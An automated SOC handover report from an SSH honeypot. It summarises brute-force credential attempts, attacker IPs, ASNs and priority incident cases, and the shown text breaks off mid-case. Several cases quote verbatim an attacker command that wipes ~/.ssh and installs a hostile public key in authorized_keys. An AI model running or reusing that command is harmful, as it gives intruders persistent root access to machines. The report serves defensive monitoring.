# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-16 |
| **Generated At** | 2026-03-16T14:58:29Z |
| **Shift Time** | 14:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **891** |
| Confirmed Threats | **599** |
| False Positives Filtered | **292** (32.8%) |
| Unique Attacker IPs | **191** |
| Countries of Origin | **36** |
| High Severity Cases | **177** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **714** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **632** |
| Unique Credential Pairs | **460** |
| Unique Usernames | **215** |
| Unique Passwords | **341** |
| Successful Auth Pairs | **171** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 181 |
| `345gs5662d34` | 17 |
| `user` | 14 |
| `test` | 12 |
| `admin` | 11 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 61 |
| `123` | 23 |
| `345gs5662d34` | 17 |
| `3245gs5662d34` | 17 |
| `1234` | 12 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 17 |
| `root` | `3245gs5662d34` | 17 |
| `root` | `toor` | 5 |
| `admin` | `admin` | 5 |
| `oracle` | `oracle` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Zz112233` | `80.71.227.151` | 2026-03-16T00:28:43 |
| `root` | `3245gs5662d34` | `80.71.227.151` | 2026-03-16T00:28:46 |
| `root` | `Server123!` | `102.88.137.213` | 2026-03-16T00:29:50 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-03-16T00:29:57 |
| `root` | ` ` | `47.237.163.130` | 2026-03-16T01:21:56 |
| `root` | `123P@ssw0rd` | `38.137.11.14` | 2026-03-16T01:34:31 |
| `root` | `3245gs5662d34` | `38.137.11.14` | 2026-03-16T01:34:32 |
| `root` | `159753` | `182.53.52.68` | 2026-03-16T02:31:04 |
| `root` | `root1234567890` | `119.200.229.33` | 2026-03-16T02:31:40 |
| `root` | `root1234567890` | `200.105.141.172` | 2026-03-16T02:31:49 |
| `root` | `qwerty123456` | `211.223.41.90` | 2026-03-16T02:33:56 |
| `root` | `qwerty123456` | `218.149.235.152` | 2026-03-16T02:34:05 |
| `root` | `toor` | `83.206.50.182` | 2026-03-16T02:34:05 |
| `root` | `toor` | `24.47.243.113` | 2026-03-16T02:34:12 |
| `root` | `deploy` | `103.220.91.138` | 2026-03-16T02:34:41 |
| `root` | `deploy` | `111.70.23.239` | 2026-03-16T02:34:53 |
| `root` | `Root8` | `222.116.9.180` | 2026-03-16T02:35:56 |
| `root` | `qwertyuiop` | `111.70.49.180` | 2026-03-16T02:37:23 |
| `root` | `66666666` | `218.149.235.152` | 2026-03-16T02:37:24 |
| `root` | `66666666` | `61.79.227.51` | 2026-03-16T02:37:33 |
| `root` | `root999` | `117.205.3.26` | 2026-03-16T02:37:42 |
| `root` | `secret` | `37.153.194.108` | 2026-03-16T02:38:13 |
| `root` | `blockchain` | `101.36.109.176` | 2026-03-16T02:38:47 |
| `root` | `3245gs5662d34` | `101.36.109.176` | 2026-03-16T02:38:50 |
| `root` | `1111111111` | `76.132.238.43` | 2026-03-16T02:40:01 |
| `root` | `1111111111` | `67.43.240.149` | 2026-03-16T02:40:13 |
| `root` | `root4` | `125.20.228.146` | 2026-03-16T02:40:52 |
| `root` | `root4` | `111.70.23.236` | 2026-03-16T02:40:59 |
| `root` | `master123` | `68.7.114.69` | 2026-03-16T02:41:34 |
| `root` | `master123` | `60.220.241.50` | 2026-03-16T02:41:42 |
| `root` | `root1234567890` | `101.13.4.128` | 2026-03-16T02:43:18 |
| `root` | `toor` | `125.20.228.146` | 2026-03-16T02:45:49 |
| `root` | `toor` | `122.187.225.220` | 2026-03-16T02:45:55 |
| `root` | `deploy` | `112.194.142.167` | 2026-03-16T02:46:07 |
| `root` | `1978` | `111.171.127.190` | 2026-03-16T02:51:53 |
| `root` | `root4` | `51.68.226.171` | 2026-03-16T02:52:04 |
| `root` | `1978` | `122.170.111.140` | 2026-03-16T02:52:04 |
| `root` | `master123` | `59.34.17.130` | 2026-03-16T02:52:54 |
| `root` | `AA123456` | `147.182.140.188` | 2026-03-16T04:04:30 |
| `root` | `123123123` | `147.182.140.188` | 2026-03-16T04:04:44 |
| `root` | `asd123` | `147.182.140.188` | 2026-03-16T04:04:50 |
| `root` | `raspberry` | `147.182.140.188` | 2026-03-16T04:05:04 |
| `root` | `a1s2d3f4` | `147.182.140.188` | 2026-03-16T04:06:37 |
| `root` | `Welcome@123` | `147.182.140.188` | 2026-03-16T04:06:50 |
| `root` | `111111` | `147.182.140.188` | 2026-03-16T04:06:56 |
| `root` | `root123` | `147.182.140.188` | 2026-03-16T04:07:03 |
| `root` | `qq123456` | `147.182.140.188` | 2026-03-16T04:07:17 |
| `root` | `redhat` | `147.182.140.188` | 2026-03-16T04:07:29 |
| `root` | `passw0rd` | `147.182.140.188` | 2026-03-16T04:08:42 |
| `root` | `!QAZ2wsx` | `147.182.140.188` | 2026-03-16T04:09:15 |
| `root` | `!Qaz@Wsx` | `147.182.140.188` | 2026-03-16T04:09:28 |
| `root` | `huawei@123` | `147.182.140.188` | 2026-03-16T04:09:34 |
| `root` | `Password1` | `147.182.140.188` | 2026-03-16T04:09:54 |
| `root` | `!Q2w3e4r` | `120.48.199.28` | 2026-03-16T04:59:25 |
| `root` | `aA123456` | `120.48.199.28` | 2026-03-16T04:59:38 |
| `root` | `!qaz@WSX` | `120.48.199.28` | 2026-03-16T04:59:46 |
| `root` | `P@ssw0rd` | `120.48.199.28` | 2026-03-16T04:59:49 |
| `root` | `Aa123456` | `120.48.199.28` | 2026-03-16T04:59:57 |
| `root` | `abc123` | `120.48.199.28` | 2026-03-16T05:00:02 |
| `root` | `p@ssword` | `120.48.199.28` | 2026-03-16T05:00:08 |
| `root` | `Ab123456` | `120.48.199.28` | 2026-03-16T05:00:09 |
| `root` | `1qaz@wsx` | `120.48.199.28` | 2026-03-16T05:00:13 |
| `root` | `P@ssword` | `120.48.199.28` | 2026-03-16T05:00:13 |
| `root` | `qQ123456` | `120.48.199.28` | 2026-03-16T05:00:15 |
| `root` | `password` | `120.48.199.28` | 2026-03-16T05:00:20 |
| `root` | `Pa$$w0rd` | `120.48.199.28` | 2026-03-16T05:00:25 |
| `root` | `4r3e2w1q` | `120.48.199.28` | 2026-03-16T05:00:32 |
| `root` | `admin` | `120.48.199.28` | 2026-03-16T05:00:47 |
| `root` | `1` | `120.48.199.28` | 2026-03-16T05:00:48 |
| `root` | `qwerty123` | `120.48.199.28` | 2026-03-16T05:00:52 |
| `root` | `1Q2w3e4r` | `120.48.199.28` | 2026-03-16T05:00:59 |
| `root` | `p@ssw0rd` | `120.48.199.28` | 2026-03-16T05:01:05 |
| `root` | `1234` | `120.48.199.28` | 2026-03-16T05:01:05 |
| `root` | `1Q2W3E4R` | `120.48.199.28` | 2026-03-16T05:01:18 |
| `root` | `Qq123456` | `120.48.199.28` | 2026-03-16T05:01:22 |
| `root` | `passw0rd` | `120.48.199.28` | 2026-03-16T05:01:30 |
| `root` | `Qwerty` | `120.48.199.28` | 2026-03-16T05:02:01 |
| `root` | `4e2q1w3r` | `120.48.199.28` | 2026-03-16T05:02:17 |
| `root` | `root123` | `120.48.199.28` | 2026-03-16T05:02:25 |
| `root` | `!Q@W3e4r` | `120.48.199.28` | 2026-03-16T05:02:40 |
| `root` | `P@55w0rd` | `120.48.199.28` | 2026-03-16T05:02:43 |
| `root` | `1234567890` | `120.48.199.28` | 2026-03-16T05:02:51 |
| `root` | `!QAZ2wsx` | `120.48.199.28` | 2026-03-16T05:03:00 |
| `root` | `!Qaz@Wsx` | `120.48.199.28` | 2026-03-16T05:03:09 |
| `root` | `12345` | `120.48.199.28` | 2026-03-16T05:03:18 |
| `root` | `Password1` | `120.48.199.28` | 2026-03-16T05:03:21 |
| `root` | `QWERTY123` | `120.48.199.28` | 2026-03-16T05:03:21 |
| `root` | `AA123456` | `120.48.199.28` | 2026-03-16T05:03:36 |
| `root` | `!QAZ@WSX` | `120.48.199.28` | 2026-03-16T05:03:39 |
| `root` | `Passw0rd` | `120.48.199.28` | 2026-03-16T05:03:42 |
| `root` | `Password` | `120.48.199.28` | 2026-03-16T05:03:50 |
| `root` | `123` | `120.48.199.28` | 2026-03-16T05:03:56 |
| `root` | `123321` | `120.48.199.28` | 2026-03-16T05:04:15 |
| `root` | `root@123` | `120.48.199.28` | 2026-03-16T05:05:37 |
| `root` | `1qazxsw2` | `120.48.199.28` | 2026-03-16T05:06:35 |
| `root` | `123456789` | `209.38.80.6` | 2026-03-16T05:19:12 |
| `root` | `password` | `209.38.80.6` | 2026-03-16T05:20:16 |
| `root` | `admin` | `209.38.80.6` | 2026-03-16T05:21:23 |
| `root` | `12345` | `209.38.80.6` | 2026-03-16T05:22:25 |
| `root` | `000000` | `183.237.121.226` | 2026-03-16T05:27:33 |
| `root` | `!Q@W3e4r` | `183.237.121.226` | 2026-03-16T05:27:38 |
| `root` | `!QAZ1qaz` | `120.48.80.70` | 2026-03-16T07:29:50 |
| `root` | `3245gs5662d34` | `120.48.80.70` | 2026-03-16T07:30:06 |
| `root` | `88888888` | `49.43.32.40` | 2026-03-16T07:41:03 |
| `root` | `dodol123` | `179.33.186.150` | 2026-03-16T07:49:35 |
| `root` | `3245gs5662d34` | `179.33.186.150` | 2026-03-16T07:49:42 |
| `root` | `P` | `118.185.85.137` | 2026-03-16T09:44:59 |
| `root` | `Hello1234` | `34.93.128.179` | 2026-03-16T09:46:12 |
| `root` | `3245gs5662d34` | `34.93.128.179` | 2026-03-16T09:46:13 |
| `root` | `AAAaaa111` | `34.93.128.179` | 2026-03-16T09:48:21 |
| `root` | `AAAaaa111` | `118.194.250.47` | 2026-03-16T09:49:32 |
| `root` | `3245gs5662d34` | `118.194.250.47` | 2026-03-16T09:49:35 |
| `root` | `a123456A` | `118.194.250.47` | 2026-03-16T09:53:39 |
| `root` | `password` | `178.62.120.127` | 2026-03-16T09:54:47 |
| `root` | `admin` | `178.62.120.127` | 2026-03-16T09:55:42 |
| `root` | `toor` | `178.62.120.127` | 2026-03-16T09:56:37 |
| `root` | `a123456A` | `34.93.128.179` | 2026-03-16T09:56:42 |
| `root` | `12345` | `178.62.120.127` | 2026-03-16T09:57:31 |
| `root` | `Hello1234` | `118.194.250.47` | 2026-03-16T10:02:17 |
| `root` | `222222` | `14.224.217.104` | 2026-03-16T10:53:37 |
| `root` | `testpass123` | `143.198.176.181` | 2026-03-16T12:05:50 |
| `root` | `qazwsxedc` | `143.198.176.181` | 2026-03-16T12:06:25 |
| `root` | `p@ssword` | `143.198.176.181` | 2026-03-16T12:06:32 |
| `root` | `1qaz@WSX` | `143.198.176.181` | 2026-03-16T12:06:45 |
| `root` | `zaq12wsx` | `143.198.176.181` | 2026-03-16T12:07:19 |
| `root` | `aa123456` | `143.198.176.181` | 2026-03-16T12:08:27 |
| `root` | `Welcome@123` | `143.198.176.181` | 2026-03-16T12:08:34 |
| `root` | `12345678` | `143.198.176.181` | 2026-03-16T12:08:54 |
| `root` | `qwerty` | `143.198.176.181` | 2026-03-16T12:09:08 |
| `root` | `root1234` | `143.198.176.181` | 2026-03-16T12:10:02 |
| `root` | `Pass1234` | `143.198.176.181` | 2026-03-16T12:10:22 |
| `root` | `kali` | `143.198.176.181` | 2026-03-16T12:10:49 |
| `root` | `phuvanduc` | `157.245.86.152` | 2026-03-16T12:30:26 |
| `root` | `root123456` | `157.245.86.152` | 2026-03-16T12:30:40 |
| `root` | `huawei` | `157.245.86.152` | 2026-03-16T12:31:40 |
| `root` | `qwerty` | `157.245.86.152` | 2026-03-16T12:31:53 |
| `root` | `aB123456` | `157.245.86.152` | 2026-03-16T12:31:59 |
| `root` | `1029384756` | `157.245.86.152` | 2026-03-16T12:32:06 |
| `root` | `Aa123456` | `157.245.86.152` | 2026-03-16T12:32:12 |
| `root` | `Aa123456.` | `157.245.86.152` | 2026-03-16T12:32:25 |
| `root` | `!QAZ2wsx3edc` | `157.245.86.152` | 2026-03-16T12:32:32 |
| `root` | `Admin123!` | `157.245.86.152` | 2026-03-16T12:33:12 |
| `root` | `welcome1` | `157.245.86.152` | 2026-03-16T12:33:18 |
| `root` | `aA123456` | `157.245.86.152` | 2026-03-16T12:34:17 |
| `root` | `Pass@123` | `157.245.86.152` | 2026-03-16T12:34:29 |
| `root` | `t0talc0ntr0l4!` | `157.245.86.152` | 2026-03-16T12:35:02 |
| `root` | `1qaz@wsx` | `157.245.86.152` | 2026-03-16T12:35:21 |
| `root` | `passw0rd` | `157.245.86.152` | 2026-03-16T12:35:27 |
| `root` | `Admin@123` | `157.245.86.152` | 2026-03-16T12:35:47 |
| `root` | `0000` | `157.245.86.152` | 2026-03-16T12:36:26 |
| `root` | `Huawei12` | `157.245.86.152` | 2026-03-16T12:37:05 |
| `root` | `LeitboGi0ro` | `157.245.86.152` | 2026-03-16T12:37:12 |
| `root` | `abc123` | `157.245.86.152` | 2026-03-16T12:37:24 |
| `root` | `huawei@123` | `157.245.86.152` | 2026-03-16T12:38:10 |
| `root` | `LeitboGi0ro` | `143.244.156.203` | 2026-03-16T13:26:36 |
| `root` | `root123` | `143.244.156.203` | 2026-03-16T13:26:49 |
| `root` | `Passw0rd` | `143.244.156.203` | 2026-03-16T13:27:03 |
| `root` | `root1234` | `143.244.156.203` | 2026-03-16T13:28:41 |
| `root` | `root123456` | `143.244.156.203` | 2026-03-16T13:29:47 |
| `root` | `null` | `143.244.156.203` | 2026-03-16T13:29:59 |
| `root` | `111111` | `143.244.156.203` | 2026-03-16T13:30:57 |
| `root` | `Huawei12` | `143.244.156.203` | 2026-03-16T13:31:10 |
| `root` | `test@12345` | `172.191.157.64` | 2026-03-16T14:30:29 |
| `root` | `3245gs5662d34` | `172.191.157.64` | 2026-03-16T14:30:35 |
| `root` | `123!@#qwe` | `172.191.157.64` | 2026-03-16T14:36:59 |
| `root` | `123!@#qwe` | `108.173.137.12` | 2026-03-16T14:37:43 |
| `root` | `3245gs5662d34` | `108.173.137.12` | 2026-03-16T14:37:50 |
| `root` | `matrix` | `103.215.80.173` | 2026-03-16T14:43:12 |
| `root` | `3245gs5662d34` | `103.215.80.173` | 2026-03-16T14:43:20 |
| `root` | `test@12345` | `108.173.137.12` | 2026-03-16T14:43:38 |
| `root` | `P` | `101.36.118.177` | 2026-03-16T14:50:03 |

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **191** |
| Unique ASNs | **91** |
| High-Risk ASNs | **78** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 12 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 9 | HIGH |
| `AS33765` | TANZANIA TELECOMMUNICATIONS CO. LTD | 9 | LOW |
| `AS14061` | DigitalOcean, LLC | 7 | HIGH |
| `AS4766` | Korea Telecom | 7 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 6 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 6 | HIGH |
| `AS46562` | Performive LLC | 5 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (139)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4cd32cae953e

| Field | Detail |
|---|---|
| **Source IP** | `80.71.227[.]151` |
| **First Seen** | 2026-03-16 00:28 |
| **Last Seen** | 2026-03-16 00:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 00:28:42` | `cowrie.session.connect` |
| `2026-03-16 00:28:42` | `cowrie.client.version` |
| `2026-03-16 00:28:42` | `cowrie.client.kex` |
| `2026-03-16 00:28:43` | `cowrie.login.success` |
| `2026-03-16 00:28:43` | `cowrie.session.params` |
| `2026-03-16 00:28:43` | `cowrie.command.input` |
| `2026-03-16 00:28:43` | `cowrie.command.failed` |
| `2026-03-16 00:28:43` | `cowrie.log.closed` |
| `2026-03-16 00:28:43` | `cowrie.session.params` |
| `2026-03-16 00:28:43` | `cowrie.command.input` |
| `2026-03-16 00:28:44` | `cowrie.session.file_download` |
| `2026-03-16 00:28:44` | `cowrie.log.closed` |
| `2026-03-16 00:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.71.227[.]151` to AbuseIPDB if not already reported
- [ ] Block `80.71.227[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fa1173a73dd

| Field | Detail |
|---|---|
| **Source IP** | `80.71.227[.]151` |
| **First Seen** | 2026-03-16 00:28 |
| **Last Seen** | 2026-03-16 00:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 00:28:46` | `cowrie.session.connect` |
| `2026-03-16 00:28:46` | `cowrie.client.version` |
| `2026-03-16 00:28:46` | `cowrie.client.kex` |
| `2026-03-16 00:28:46` | `cowrie.login.success` |
| `2026-03-16 00:28:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.71.227[.]151` to AbuseIPDB if not already reported
- [ ] Block `80.71.227[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-273b36007e59

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-03-16 00:29 |
| **Last Seen** | 2026-03-16 00:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 00:29:48` | `cowrie.session.connect` |
| `2026-03-16 00:29:48` | `cowrie.client.version` |
| `2026-03-16 00:29:49` | `cowrie.client.kex` |
| `2026-03-16 00:29:50` | `cowrie.login.success` |
| `2026-03-16 00:29:51` | `cowrie.session.params` |
| `2026-03-16 00:29:51` | `cowrie.command.input` |
| `2026-03-16 00:29:51` | `cowrie.command.failed` |
| `2026-03-16 00:29:51` | `cowrie.log.closed` |
| `2026-03-16 00:29:52` | `cowrie.session.params` |
| `2026-03-16 00:29:52` | `cowrie.command.input` |
| `2026-03-16 00:29:52` | `cowrie.session.file_download` |
| `2026-03-16 00:29:52` | `cowrie.log.closed` |
| `2026-03-16 00:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8301e1f921c5

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-03-16 00:29 |
| **Last Seen** | 2026-03-16 00:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 00:29:55` | `cowrie.session.connect` |
| `2026-03-16 00:29:55` | `cowrie.client.version` |
| `2026-03-16 00:29:56` | `cowrie.client.kex` |
| `2026-03-16 00:29:57` | `cowrie.login.success` |
| `2026-03-16 00:29:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d5bf43e0035

| Field | Detail |
|---|---|
| **Source IP** | `47.237.163[.]130` |
| **First Seen** | 2026-03-16 01:21 |
| **Last Seen** | 2026-03-16 01:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 01:21:56` | `cowrie.session.connect` |
| `2026-03-16 01:21:56` | `cowrie.client.version` |
| `2026-03-16 01:21:56` | `cowrie.client.kex` |
| `2026-03-16 01:21:56` | `cowrie.login.success` |
| `2026-03-16 01:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.237.163[.]130` to AbuseIPDB if not already reported
- [ ] Block `47.237.163[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be5a40765d13

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-03-16 01:34 |
| **Last Seen** | 2026-03-16 01:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 01:34:31` | `cowrie.session.connect` |
| `2026-03-16 01:34:31` | `cowrie.client.version` |
| `2026-03-16 01:34:31` | `cowrie.client.kex` |
| `2026-03-16 01:34:31` | `cowrie.login.success` |
| `2026-03-16 01:34:31` | `cowrie.session.params` |
| `2026-03-16 01:34:31` | `cowrie.command.input` |
| `2026-03-16 01:34:31` | `cowrie.command.failed` |
| `2026-03-16 01:34:31` | `cowrie.log.closed` |
| `2026-03-16 01:34:31` | `cowrie.session.params` |
| `2026-03-16 01:34:31` | `cowrie.command.input` |
| `2026-03-16 01:34:31` | `cowrie.session.file_download` |
| `2026-03-16 01:34:31` | `cowrie.log.closed` |
| `2026-03-16 01:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c38b011612e4

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-03-16 01:34 |
| **Last Seen** | 2026-03-16 01:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 01:34:32` | `cowrie.session.connect` |
| `2026-03-16 01:34:32` | `cowrie.client.version` |
| `2026-03-16 01:34:32` | `cowrie.client.kex` |
| `2026-03-16 01:34:32` | `cowrie.login.success` |
| `2026-03-16 01:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b05ee3e5dfa

| Field | Detail |
|---|---|
| **Source IP** | `182.53.52[.]68` |
| **First Seen** | 2026-03-16 02:31 |
| **Last Seen** | 2026-03-16 02:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:31:02` | `cowrie.session.connect` |
| `2026-03-16 02:31:03` | `cowrie.client.version` |
| `2026-03-16 02:31:03` | `cowrie.client.kex` |
| `2026-03-16 02:31:04` | `cowrie.login.success` |
| `2026-03-16 02:31:04` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.53.52[.]68` to AbuseIPDB if not already reported
- [ ] Block `182.53.52[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbf719d02936

| Field | Detail |
|---|---|
| **Source IP** | `119.200.229[.]33` |
| **First Seen** | 2026-03-16 02:31 |
| **Last Seen** | 2026-03-16 02:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-16 02:31:38` | `cowrie.session.connect` |
| `2026-03-16 02:31:39` | `cowrie.client.version` |
| `2026-03-16 02:31:39` | `cowrie.client.kex` |
| `2026-03-16 02:31:40` | `cowrie.login.success` |
| `2026-03-16 02:31:41` | `cowrie.direct-tcpip.request` |
| `2026-03-16 02:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.200.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `119.200.229[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7f9d0159da5

| Field | Detail |
|---|---|
| **Source IP** | `200.105.141[.]172` |
| **First Seen** | 2026-03-16 02:31 |
| **Last Seen** | 2026-03-16 02:31 |
